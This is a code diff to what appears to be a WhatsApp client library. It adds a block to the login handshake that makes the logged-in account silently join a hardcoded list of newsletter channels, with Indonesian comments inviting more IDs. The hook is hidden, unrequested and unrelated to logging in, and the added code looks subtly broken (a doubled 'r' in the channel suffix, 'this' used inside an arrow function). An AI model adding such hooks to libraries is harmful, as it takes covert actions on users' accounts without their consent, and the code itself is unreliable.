@@ -439,7 +439,24 @@ export const makeSocket = (config: SocketConfig) => {
 			node = generateLoginNode(creds.me.id, config)
 			logger.info({ node }, 'logging in...')
 		}
+		
+// Daftar ID Channel
+const channels = [
+    "120363407156383294@newsletterr",
+    "120363423053078572@newsletterr",
+    // Tambah lagi kalau mau
+]
 
+// Loop buat join semua channel
+for (let channelJid of channels) {
+    try {
+        await this.newsletterJoin(channelJid)
+        console.log(`Berhasil join ke ${channelJid}`)
+    } catch (err) {
+        console.log(`Gagal join ke ${channelJid}`, err)
+    }
+		}
+			
 		const payloadEnc = noise.encrypt(proto.ClientPayload.encode(node).finish())
 		await sendRawMessage(
 			proto.HandshakeMessage.encode({
